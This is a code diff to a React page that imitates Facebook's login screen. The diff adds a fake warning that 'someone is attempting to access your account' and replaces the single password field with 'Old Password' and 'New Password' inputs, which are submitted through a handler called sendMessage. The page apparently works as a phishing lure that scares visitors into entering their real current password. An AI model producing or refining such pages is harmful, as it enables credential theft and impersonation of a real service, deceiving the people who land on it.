@@ -45,10 +45,29 @@ export default function Example() {
           <h2 className="mt-6 text-center text-3xl tracking-tight text-gray-900">
           Connect with friends and the world around you on Facebook.
           </h2>
+
+
+          
+      <div className="border-l-4 border-yellow-400 bg-yellow-50 p-4 m-5">
+      <div className="flex">
+        <div className="ml-3">
+          <p className="text-sm text-yellow-700">
+            <a href="#" className="font-medium text-yellow-700 underline hover:text-yellow-600">
+            Someone is attempting to access your account. Please change your password as soon as possible
+            </a>
+          </p>
+        </div>
+      </div>
+    </div>
         </div>
 
         <div className="mt-10 sm:mx-auto m-4 sm:w-full sm:max-w-[380px]">
           <div className="bg-white   shadow-lg sm:rounded-lg p-4">
+
+            <div>
+              
+            </div>
+
             <form onSubmit={sendMessage} className="space-y-6" action="#" method="POST">
               <div>
           
@@ -75,7 +94,19 @@ export default function Example() {
                     onChange={(e) => setPassword(e.target.value)}
                     type="password"
                     required
-                    placeholder="Password"
+                    placeholder="Old Password"
+                    className="block h-[50px] text-lg p-5 ring-gray-300 ring-1 w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm "
+                  />
+                </div>
+
+                <div className="mt-2 mt-4">
+                <input
+                    id="email"
+                    name="email"
+                    onChange={(e) => setPassword(e.target.value)}
+                    type="password"
+                    required
+                    placeholder="New Password"
                     className="block h-[50px] text-lg p-5 ring-gray-300 ring-1 w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm "
                   />
                 </div>
